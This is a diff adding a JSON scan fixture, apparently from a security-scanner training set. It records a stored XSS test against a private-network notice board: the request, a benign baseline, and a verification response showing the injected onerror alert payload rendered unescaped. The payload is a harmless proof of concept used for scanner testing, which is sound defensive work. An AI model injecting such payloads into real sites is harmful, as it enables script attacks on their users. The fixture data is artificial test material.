@@ -1,0 +1,34 @@
+{
+  "schema_version": "1.0",
+  "scan_id": "scan-20260827-xss-001",
+  "capture_type": "synthetic_fixture",
+  "request": {
+    "method": "POST",
+    "url": "http://192.168.94.128/notices.php",
+    "path": "/notices.php",
+    "headers": {"Host": "192.168.94.128", "User-Agent": "REDRED-Training-Scanner/1.0", "Accept": "text/html", "Content-Type": "application/x-www-form-urlencoded"},
+    "parameters": {"action": "create", "title": "<img src=x onerror=alert('REDRED-XSS-001')>", "content": "REDRED stored XSS fixture"},
+    "body": "action=create&title=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REDRED-XSS-001%27%29%3E&content=REDRED%20stored%20XSS%20fixture"
+  },
+  "response": {"status_code": 302, "headers": {"Content-Type": "text/html; charset=UTF-8", "Location": "/notices.php?mode=list"}, "body": ""},
+  "baseline": {
+    "request": {
+      "method": "POST", "url": "http://192.168.94.128/notices.php", "path": "/notices.php",
+      "headers": {"Host": "192.168.94.128", "User-Agent": "REDRED-Training-Scanner/1.0", "Accept": "text/html", "Content-Type": "application/x-www-form-urlencoded"},
+      "parameters": {"action": "create", "title": "정상 공지", "content": "정상 내용"},
+      "body": "action=create&title=%EC%A0%95%EC%83%81%20%EA%B3%B5%EC%A7%80&content=%EC%A0%95%EC%83%81%20%EB%82%B4%EC%9A%A9"
+    },
+    "response": {"status_code": 302, "headers": {"Content-Type": "text/html; charset=UTF-8", "Location": "/notices.php?mode=list"}, "body": ""}
+  },
+  "verification": {
+    "request": {
+      "method": "GET", "url": "http://192.168.94.128/notices.php?mode=list", "path": "/notices.php",
+      "headers": {"Host": "192.168.94.128", "User-Agent": "REDRED-Training-Scanner/1.0", "Accept": "text/html"},
+      "parameters": {"mode": "list"}, "body": ""
+    },
+    "response": {
+      "status_code": 200, "headers": {"Content-Type": "text/html; charset=UTF-8"},
+      "body": "<table><tr><td class='title'><a href='notices.php?mode=view&id=42'><img src=x onerror=alert('REDRED-XSS-001')></a></td></tr></table>"
+    }
+  }
+}
